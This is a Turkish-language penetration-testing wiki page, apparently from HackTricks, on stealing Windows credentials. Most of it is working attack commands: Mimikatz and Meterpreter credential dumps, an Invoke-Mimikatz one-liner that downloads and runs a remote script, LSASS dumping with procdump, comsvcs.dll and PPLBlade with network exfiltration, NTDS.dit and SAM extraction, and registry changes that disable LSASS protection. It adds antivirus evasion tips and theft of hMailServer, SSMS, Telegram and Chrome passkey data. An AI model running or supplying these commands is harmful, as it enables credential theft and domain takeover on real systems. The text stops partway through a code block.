# Windows Kimlik Bilgilerini Çalma

{{#include ../../banners/hacktricks-training.md}}

## Kimlik Bilgileri Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Mimikatz'in yapabileceği diğer şeyleri** [**bu sayfada**](credentials-mimikatz.md)** bulun.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Olası kimlik bilgisi korumaları hakkında buradan bilgi edinin.**](credentials-protections.md) **Bu korumalar, Mimikatz'in bazı kimlik bilgilerini çıkarmasını önleyebilir.**

## Meterpreter ile Kimlik Bilgileri

Kurbanın içinde **parolaları ve hash'leri aramak** için oluşturduğum [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **eklentisini** kullanın.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## AV'yi Atlatma

### Procdump + Mimikatz

[**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**'ten Procdump meşru bir Microsoft aracı olduğundan**, Defender tarafından tespit edilmez.\
Bu aracı **lsass sürecini dump etmek**, **dump'ı indirmek** ve dump içindeki **kimlik bilgilerini yerel olarak çıkarmak** için kullanabilirsiniz.

[SharpDump](https://github.com/GhostPack/SharpDump) aracını da kullanabilirsiniz.

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Bu işlem [SprayKatz](https://github.com/aas-n/spraykatz) ile otomatik olarak gerçekleştirilir: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Not**: Bazı **AV** yazılımları, **lsass.exe'yi dump etmek için procdump.exe kullanılmasını** **zararlı** olarak **tespit edebilir**. Bunun nedeni, **"procdump.exe" ve "lsass.exe"** dizelerini **tespit etmeleridir**. Bu yüzden, **lsass.exe adı yerine** procdump'a **argüman olarak** lsass.exe'nin **PID** değerini **vermek** daha **gizlidir**.

### lsass'i **comsvcs.dll** ile dump etme

`C:\Windows\System32` konumunda bulunan **comsvcs.dll** adlı bir DLL, çökme durumunda **process belleğini dump etmekten** sorumludur. Bu DLL, `rundll32.exe` kullanılarak çağrılmak üzere tasarlanmış **`MiniDumpW`** adlı bir **işlev** içerir.\
İlk iki argümanın kullanılması önemli değildir; ancak üçüncü argüman üç bileşene ayrılır. Dump edilecek process'in ID'si ilk bileşeni, dump dosyasının konumu ikinci bileşeni oluşturur ve üçüncü bileşen kesinlikle **full** sözcüğü olmalıdır. Alternatif seçenek yoktur.\
Bu üç bileşen ayrıştırıldığında DLL, dump dosyasını oluşturur ve belirtilen process'in belleğini bu dosyaya aktarır.\
**comsvcs.dll**, lsass process'ini dump etmek için kullanılabilir; böylece procdump'ı yükleyip çalıştırma gereği ortadan kalkar. Bu yöntem [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) adresinde ayrıntılı olarak açıklanmıştır.<sup>[[9]](#references)</sup>

Çalıştırmak için aşağıdaki komut kullanılır:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Bu süreci** [**lssasy**](https://github.com/Hackndo/lsassy)** ile otomatikleştirebilirsiniz.**

### **Task Manager ile lsass dökümü alma**

1. Task Bar'a sağ tıklayın ve Task Manager'a tıklayın.
2. More details'a tıklayın.
3. Processes sekmesinde "Local Security Authority Process" sürecini bulun.
4. "Local Security Authority Process" sürecine sağ tıklayın ve "Create dump file" seçeneğine tıklayın.

### procdump ile lsass dökümü alma

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketinin bir parçası olan, Microsoft tarafından imzalanmış bir binary'dir.

Daha önceden oluşturulmuş tam sistem crash dump'ı veya erişilebilir bir kullanıcı klasöründeki sıkıştırılmış kopyası, çevrimdışı analiz için kimlik bilgisi verilerini barındırıyor olabilir. `MEMORY.DMP` ve `MEMORY.7z` gibi dosya adları yalnızca inceleme ipuçlarıdır: kaynağı ve erişimi doğrulayın; kullanılabilir veya güncel kimlik bilgileri içerdiğini varsaymayın.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## PPLBlade ile lsass dump etme

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade), bellek dump'ını obfuscate etmeyi ve diske kaydetmeden uzak iş istasyonlarına aktarmayı destekleyen bir Protected Process Dumper Tool'dur.

**Temel işlevler**:

1. PPL korumasını atlatma
2. Defender'ın imza tabanlı algılama mekanizmalarından kaçınmak için bellek dump dosyalarını obfuscate etme
3. Bellek dump'ını diske kaydetmeden RAW ve SMB yükleme yöntemleriyle aktarma (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – SSP tabanlı, MiniDumpWriteDump kullanmadan LSASS dumping

Ink Dragon, `MiniDumpWriteDump` çağrısını hiç yapmayan ve böylece bu API üzerindeki EDR hook’larını devreye sokmayan, **LalsDumper** adlı üç aşamalı bir dumper kullanıyor:<sup>[[3]](#references)</sup>

1. **Aşama 1 loader (`lals.exe`)** – `fdp.dll` içinde 32 küçük `d` karakterinden oluşan bir placeholder arar, bunu `rtu.txt` dosyasının mutlak yolu ile değiştirir, yamalanmış DLL’i `nfdp.dll` olarak kaydeder ve `AddSecurityPackageA("nfdp","fdp")` çağrısını yapar. Böylece **LSASS**, kötü amaçlı DLL’i yeni bir Security Support Provider (SSP) olarak yüklemeye zorlanır.
2. **LSASS içindeki Aşama 2** – LSASS `nfdp.dll` dosyasını yüklediğinde DLL, `rtu.txt` dosyasını okur, her byte’ı `0x20` ile XOR’lar ve yürütmeyi devretmeden önce kodu çözülmüş blob’u belleğe eşler.
3. **Aşama 3 dumper** – Belleğe eşlenen payload, hash’lenmiş API adlarından çözümlenen **direct syscalls** kullanarak MiniDump mantığını yeniden uygular (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). `Tom` adlı özel bir export, `%TEMP%\<pid>.ddt` dosyasını açar, sıkıştırılmış LSASS dump’ını dosyaya yazar ve daha sonra exfiltration yapılabilmesi için handle’ı kapatır.

Operatör notları:

* `lals.exe`, `fdp.dll`, `nfdp.dll` ve `rtu.txt` dosyalarını aynı dizinde tutun. Aşama 1, hard-coded placeholder’ı `rtu.txt` dosyasının mutlak yolu ile değiştirir; bu nedenle dosyaları farklı yerlere koymak zinciri bozar.
* Kayıt işlemi, `nfdp` öğesinin `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` konumuna eklenmesiyle yapılır. LSASS’in SSP’yi her açılışta yeniden yüklemesini sağlamak için bu değeri kendiniz ekleyebilirsiniz.
* `%TEMP%\*.ddt` dosyaları sıkıştırılmış dump’lardır. Dosyaları yerel olarak açın, ardından credential extraction için Mimikatz/Volatility araçlarına verin.
* `AddSecurityPackageA` çağrısının başarılı olması için `lals.exe` yönetici/SeTcb haklarıyla çalıştırılmalıdır; çağrı döndüğünde LSASS sahte SSP’yi şeffaf biçimde yükler ve Aşama 2’yi yürütür.
* DLL’i diskten silmek onu LSASS’ten çıkarmaz. Ya registry girdisini silip LSASS’i yeniden başlatın (reboot) ya da uzun süreli persistence için bırakın.

## CrackMapExec

### SAM hash’lerini dump et

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA secrets

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Hedef DC'den NTDS.dit dosyasını dökme

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Hedef DC'den NTDS.dit parola geçmişini dump et

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Her NTDS.dit hesabı için pwdLastSet özniteliğini göster

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Stealing SAM & SYSTEM

Bu dosyalar _C:\windows\system32\config\SAM_ ve _C:\windows\system32\config\SYSTEM_ konumlarında **bulunur**. Ancak korundukları için bunları normal bir şekilde kopyalayamazsınız.

### Kayıt Defterinden

Bu dosyaları çalmanın en kolay yolu, Kayıt Defteri'nden bir kopyasını almaktır:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**İndirin** bu dosyaları Kali makinenize ve **hash'leri çıkarın** şu yöntemi kullanarak:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Bu hizmeti kullanarak korumalı dosyaları kopyalayabilirsiniz. Administrator olmanız gerekir.

#### vssadmin kullanımı

vssadmin ikilisi yalnızca Windows Server sürümlerinde kullanılabilir.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Ancak aynı işlemi **Powershell** üzerinden de yapabilirsiniz. **SAM dosyasının nasıl kopyalanacağına** dair bir örnek (kullanılan sürücü "C:" ve dosya C:\users\Public konumuna kaydediliyor); ancak bunu korumalı herhangi bir dosyayı kopyalamak için kullanabilirsiniz:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Kitaptan kod: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Son olarak, SAM, SYSTEM ve ntds.dit dosyalarının bir kopyasını oluşturmak için [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) aracını da kullanabilirsiniz.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory Kimlik Bilgileri - NTDS.dit**

**NTDS.dit** dosyası, kullanıcı nesneleri, gruplar ve bunların üyelikleri hakkında önemli verileri barındırdığı için **Active Directory**'nin kalbi olarak bilinir. Etki alanı kullanıcılarının **password hash**'leri bu dosyada saklanır. Bu dosya bir **Extensible Storage Engine (ESE)** veritabanıdır ve **_%SystemRoom%/NTDS/ntds.dit_** konumunda bulunur.

Bu veritabanında üç temel tablo tutulur:

- **Data Table**: Kullanıcılar ve gruplar gibi nesnelerle ilgili ayrıntıları saklar.
- **Link Table**: Grup üyelikleri gibi ilişkileri takip eder.
- **SD Table**: Her nesneye ait **security descriptor**'lar burada tutulur ve depolanan nesnelerin güvenliği ile erişim denetimi sağlanır.

Christoffer Andersson'ın veritabanı katmanıyla ilgili araştırması, bu tabloları ve sürüme özgü davranışlarını daha ayrıntılı biçimde belgeliyor.<sup>[[8]](#references)</sup>

Windows bu dosyayla etkileşim kurmak için _Ntdsa.dll_ kullanır ve bu dosya _lsass.exe_ tarafından kullanılır. Ardından, **NTDS.dit** dosyasının bir **bölümü** **`lsass` belleğinde** bulunabilir (performansı artırmak için kullanılan bir **cache** sayesinde, muhtemelen en son erişilen verileri bulabilirsiniz).

#### NTDS.dit içindeki hash'leri çözme

Hash üç kez şifrelenir:

1. Password Encryption Key (**PEK**) değerini **BOOTKEY** ve **RC4** kullanarak çözün.
2. **Hash**'i **PEK** ve **RC4** kullanarak çözün.
3. **Hash**'i **DES** kullanarak çözün.

**PEK**, her domain controller'da **aynı değere** sahiptir; ancak domain controller'a özgü **BOOTKEY** kullanılarak, ilgili domain controller'ın **SYSTEM** hive'ında **NTDS.dit** içine **şifrelenmiş** olarak kaydedilir. Bu nedenle, kimlik bilgilerini çıkarmak için hem **NTDS.dit** hem de **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) gerekir.

### Ntdsutil kullanarak NTDS.dit dosyasını kopyalama

Windows Server 2008'den beri kullanılabilir.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Ayrıca **ntds.dit** dosyasını kopyalamak için [**volume shadow copy**](#stealing-sam-and-system) yöntemini de kullanabilirsiniz. **SYSTEM file** dosyasının da bir kopyasına ihtiyacınız olacağını unutmayın (yine, [**registry'den dump edin veya volume shadow copy**](#stealing-sam-and-system) yöntemini kullanın).

### **NTDS.dit dosyasından hash'leri çıkarma**

**NTDS.dit** ve **SYSTEM** dosyalarını **edindikten** sonra, hash'leri **çıkarmak** için _secretsdump.py_ gibi araçları kullanabilirsiniz:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Bunları geçerli bir domain admin kullanıcısı kullanarak **otomatik olarak da çıkarabilirsiniz**:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

For **büyük NTDS.dit dosyalarında** dosyanın [gosecretsdump](https://github.com/c-sto/gosecretsdump) kullanılarak çıkarılması önerilir.

Son olarak, **metasploit modülünü** de kullanabilirsiniz: _post/windows/gather/credentials/domain_hashdump_ veya **mimikatz** `lsadump::lsa /inject`

### **NTDS.dit dosyasından bir SQLite veritabanına domain nesnelerini çıkarma**

NTDS nesneleri, [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) ile bir SQLite veritabanına çıkarılabilir. Ham NTDS.dit dosyası alındıktan sonra daha fazla bilgi çıkarmak için yalnızca secrets değil, nesnelerin ve özniteliklerinin tamamı da çıkarılır.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

`SYSTEM` hive isteğe bağlıdır ancak sırların şifresinin çözülmesini sağlar (NT ve LM hash'leri, açık metin parolalar, Kerberos veya trust anahtarları gibi ek kimlik bilgileri, NT ve LM parola geçmişleri). Diğer bilgilerin yanı sıra şu veriler çıkarılır: hash'leriyle birlikte kullanıcı ve makine hesapları, UAC bayrakları, son oturum açma ve parola değiştirme zaman damgaları, hesap açıklamaları, adlar, UPN, SPN, gruplar ve özyinelemeli üyelikler, organizasyon birimleri ağacı ve üyelikleri, trust türü, yönü ve öznitelikleriyle birlikte güvenilen etki alanları...

## Lazagne

İkili dosyayı [buradan](https://github.com/AlessandroZ/LaZagne/releases) indirin. Bu ikili dosyayı çeşitli yazılımlardan kimlik bilgilerini çıkarmak için kullanabilirsiniz.

```
lazagne.exe all
```

## SAM ve LSASS'ten kimlik bilgilerini çıkarmak için diğer araçlar

### Windows credentials Editor (WCE)

Bu araç, bellekten kimlik bilgilerini çıkarmak için kullanılabilir. Şuradan indirin: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM dosyasından kimlik bilgilerini çıkarır.

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

SAM dosyasından kimlik bilgilerini çıkarın

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Şuradan indirin:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) ve yalnızca **çalıştırın**; parolalar çıkarılır.

## Boşta kalan RDP oturumlarını inceleme ve güvenlik denetimlerini zayıflatma

Ink Dragon’ın FinalDraft RAT’i, teknikleri her red-teamer için kullanışlı olan bir `DumpRDPHistory` tasker’ı içerir:<sup>[[3]](#references)</sup>

### DumpRDPHistory tarzı telemetri toplama

* **Giden RDP hedefleri** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` konumundaki her kullanıcı hive’ını ayrıştırın. Her alt anahtar sunucu adını, `UsernameHint` değerini ve son yazma zaman damgasını içerir. FinalDraft’ın mantığını PowerShell ile tekrarlayabilirsiniz:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Gelen RDP kanıtları** – kutuyu kimin yönettiğini belirlemek için `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` günlüğünde **21** (başarılı oturum açma) ve **25** (bağlantı kesilmesi) Event ID'lerini sorgulayın:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Düzenli olarak bağlanan Domain Admin kullanıcısını öğrendikten sonra, **disconnected** oturumu hâlâ mevcutken LSASS belleğini (LalsDumper/Mimikatz ile) dökün. CredSSP + NTLM fallback, doğrulayıcılarını ve token'larını LSASS'te bırakır; bunlar daha sonra SMB/WinRM üzerinden yeniden oynatılarak `NTDS.dit` alınabilir veya domain controller'larda kalıcılık sağlanabilir.

### FinalDraft'ın hedeflediği Registry düşürmeleri

Aynı implant, credential hırsızlığını kolaylaştırmak için birkaç registry key'ini de kurcalar:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` ayarı, RDP sırasında kimlik bilgileri/biletlerin tam olarak yeniden kullanılmasını zorunlu kılar ve pass-the-hash benzeri pivotlara olanak tanır.
* `LocalAccountTokenFilterPolicy=1`, UAC token filtrelemesini devre dışı bırakır; böylece yerel yöneticiler ağ üzerinden kısıtlanmamış token'lar alır.
* `DSRMAdminLogonBehavior=2`, DC çevrimiçiyken DSRM yöneticisinin oturum açmasına izin verir ve saldırganlara yerleşik, yüksek ayrıcalıklı başka bir hesap sağlar.
* `RunAsPPL=0`, LSASS PPL korumalarını kaldırarak LalsDumper gibi dumper'ların belleğe erişmesini çok kolaylaştırır.

## hMailServer yapılandırma kimlik bilgileri (sistem ele geçirildikten sonra)

Kurulum düzenine göre `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` ve `C:\ProgramData\hMailServer\hMailServer.ini` dosyalarının tam konumlarını kontrol edin. Okunabilir ve boş olmayan bir `[Security] AdministratorPassword=` değeri, hMailServer yönetici parola hash'idir; Windows Administrator parolasının kanıtı değildir. Bu kimlik bilgisi elde edilirse, herhangi bir Windows hesabına geçiş için parola tekrarının ve oturum açma haklarının ayrıca doğrulanması gerekir.

SQL CE veritabanı kullanan kurulumlarda, INI dosyasındaki ayrı `[Database] Password=` değeri veritabanını korur. Eski kurulumlarda bu değer, statik `THIS_KEY_IS_NOT_SECRET` anahtarı ve 4 baytlık word endianness swap'leri kullanılarak Blowfish ile şifrelenir. INI dosyasındaki hex dizgesini şu Python snippet'iyle kullanın:<sup>[[2]](#references)</sup>

Öncelikle mevcut hesabın hem INI dosyasını hem de ilgili SQL CE `.sdf` veritabanını okuyabildiğini doğrulayın. INI parolası veritabanını korur; veritabanında saklanan posta kutusu hesabı hash'lerinden farklıdır. Kullanımda olan bir veritabanını incelemek veya yükseltmek için canlı dosyayı değil, bir **kopyasını** kullanın.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Açık metin parolayı kullanarak dosya kilitlerini önlemek için SQL CE veritabanını kopyalayın, 32 bit sağlayıcıyı yükleyin ve hash'leri sorgulamadan önce gerekirse yükseltin:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

`accountpassword` sütunu hMailServer hash biçimini kullanır (hashcat mode `1421`). Kırılmış bir mailbox parolası, yalnızca bu parola bir local/domain hesabında tekrar kullanılıyorsa ve bu hesap gerekli remote-logon haklarına sahipse Windows kullanıcı pivot'u sağlar.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Bazı araçlar, LSA logon callback `LsaApLogonUserEx2`'yi intercept ederek **plaintext logon passwords** yakalar. Amaç, kimlik bilgilerinin **logon sırasında** (hash'lenmeden önce) yakalanması ve ardından diske yazılması veya operatöre döndürülmesi için authentication package callback'ini hook etmek ya da sarmalamaktır. Bu genellikle LSA'ya inject olan veya LSA'ya kaydolan, ardından her başarılı interactive/network logon event'ini username, domain ve password ile birlikte kaydeden bir helper olarak uygulanır.<sup>[[1]](#references)</sup>

Operasyonel notlar:
- Helper'ı authentication path'e yüklemek için local admin/SYSTEM gerekir.
- Yakalanan kimlik bilgileri yalnızca bir logon gerçekleştiğinde görünür (hook'a bağlı olarak interactive, RDP, service veya network logon).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS), kaydedilmiş bağlantı bilgilerini kullanıcı başına bir `sqlstudio.bin` dosyasında saklar. Özel dump araçları dosyayı ayrıştırıp kaydedilmiş SQL kimlik bilgilerini kurtarabilir. Yalnızca komut çıktısı döndüren shell'lerde dosya genellikle Base64'e encode edilip stdout'a yazdırılarak exfiltrate edilir.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Operatör tarafında, dosyayı yeniden oluşturun ve kimlik bilgilerini kurtarmak için dumper'ı yerel olarak çalıştırın:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Telegram Desktop `tdata` oturum hırsızlığı

Telegram Desktop, yetkilendirme ve hesap durumunu **`tdata`** dizininde tutar. Kopyalanan bir oturum, yetkilendirme geçerli olduğu sürece hesap parolası olmadan kimlik doğrulamak için uyumlu araçlarla yüklenebilir; yerel veri şifrelemesi etkinse, oturumu çalan kişinin parolaya da ihtiyacı vardır. Kimliği doğrulanmış bir oturum, kimlik verilerini, sohbet ve üyelik meta verilerini, mesajları ve indirilebilir medyayı açığa çıkarabilir.<sup>[[10]](#references)</sup>

### Bulma ve edinme

Hem yüklü hem de taşınabilir düzenleri arayın; Microsoft Store paket adları değişebildiğinden, `TelegramMessenge` içeren paket dizinlerini listeleyin ve bunların `LocalCache\Roaming` alt ağacını inceleyin.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Normal okumalar başarısız olursa ve process token’ı `SeBackupPrivilege` ayrıcalığını **zaten içeriyor ve etkinleştirmişse**, backup-aware access bir alternatif sağlar; bu yöntem ayrıcalığı edinmez veya process’i yükseltmez. Gerekli token ayrıcalıkları mevcutsa `FILE_FLAG_BACKUP_SEMANTICS` ile `CreateFileW`, backup/restore semantiği isteyebilir ve dosya güvenlik denetimlerini geçersiz kılabilir; ancak bu flag tek başına uyumsuz bir sharing lock’u aşamaz.<sup>[[10]](#references)[[11]](#references)</sup>

Kullanımdayken kilitli dosyalar için bir **Volume Shadow Copy** oluşturun/okuyun; ACL engelli dosyalar için `robocopy /B`, backup mode kullanır ve dosya ile dizin ACL’lerini geçersiz kılar.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Bant genişliğine duyarlı bir implant önce yalnızca dosya yolu envanterini gönderebilir, C2'de zaten depolanmış yollarla birlikte bir anlık görüntü tanımlayıcısı alabilir ve yalnızca eksik dosyaları yükleyebilir. Bu nedenle, özyinelemeli `tdata` envanterlemesinden sonra yapılan küçük artımlı aktarımlar bile oturum hırsızlığının başarılı olduğunu gösterebilir.<sup>[[10]](#references)</sup>

### Tespit ve sınırlama

Telegram dışındaki bir sürecin `tdata` dizinine özyinelemeli erişimini; `SeBackupPrivilege` etkinleştirilmesi, yedekleme semantiğiyle dosya açılması, VSS etkinliği veya `/B` kullanan bir `robocopy.exe` alt süreciyle ilişkilendirin. Ayrıca hem `%APPDATA%` hem de `%LOCALAPPDATA%\Packages` dizinlerinin hızla listelenmesini ve ardından aynı süreçten giden bağlantıları araştırın. İhlal sonrasında, tanımadığınız oturumları sonlandırmak için **Settings → Devices** (veya **Privacy & Security → Active Sessions**) bölümünü kullanın; yalnızca iki adımlı doğrulamayı etkinleştirmek, daha önce çalınmış bir yetkilendirmeyi iptal etmez.<sup>[[10]](#references)[[13]](#references)</sup>

## Windows'ta Chrome'dan Passkeys / WebAuthn kimlik bilgisi hırsızlığı

**Google Password Manager ile eşitlenen passkeys** kullanan bir Windows ana bilgisayarında **kurban kullanıcısı** olarak kod yürütme elde edilirse, **admin/SYSTEM** yetkisi **olmadan da** passkeys ilgi çekici bir post-exploitation hedefi hâline gelir.<sup>[[4]](#references)</sup>

### İlgi çekici yerel yapıtlar

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`**, protobuf ile kodlanmış **`WebauthnCredentialSpecifics`** kayıtlarını depolar. Aynı kullanıcı bağlamındaki bir süreç, eşitlenen passkey'lerin **RP ID** değerini, **username** bilgisini, **credential ID** değerini ve şifrelenmiş private-key materyalini listeleyebilir.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`**, **`wrapped_identity_private_key`** ve eşitlenen kimlik bilgilerini kurtarmak için kullanılan sarılmış sır gibi yerel cihaz kaydı durumunu depolar.<sup>[[4]](#references)</sup>

Hızlı triyaj:

```powershell
